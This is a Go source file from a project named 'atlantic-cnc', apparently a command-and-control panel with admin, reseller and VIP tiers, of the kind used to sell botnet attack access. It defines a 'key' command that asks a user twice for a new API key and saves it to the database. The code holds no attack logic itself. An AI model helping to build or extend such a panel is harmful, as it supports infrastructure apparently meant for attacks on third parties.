package extra_Command

import (
	"atlantic-cnc/core/mysql"
	"atlantic-cnc/core/sessions/sessions"

	"golang.org/x/term"
)


func init() {

	Register(&Command{
		Name: "key",

		Description: "Changes/sets your API Key",

		Admin: false,
		Reseller: false,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {

			apikeybef := term.NewTerminal(Session.Channel, "\x1b[0mNew API Key>\x1b[38;5;16m")

			APIKeyOne, error := apikeybef.ReadLine()
			if error != nil {
				return error
			}

			apikeytwobef := term.NewTerminal(Session.Channel, "\x1b[0mComfirm New API Key>\x1b[38;5;16m")

			APIKeyTwo, error := apikeytwobef.ReadLine()
			if error != nil {
				return error
			}

			if APIKeyOne != APIKeyTwo {
				Session.Channel.Write([]byte("\x1b[0mKeys do not match!\r\n"))
				return nil
			}

			done := database.EditFeild(Session.User.Username, "APIkey", APIKeyTwo)
			if !done {
				Session.Channel.Write([]byte("\x1b[0mfailed to set your key correctly!\r\n"))
				return nil
			} else {
				Session.Channel.Write([]byte("\x1b[0mKeyvwas correctly set!\r\n"))
				return nil
			}

		},
	})
}
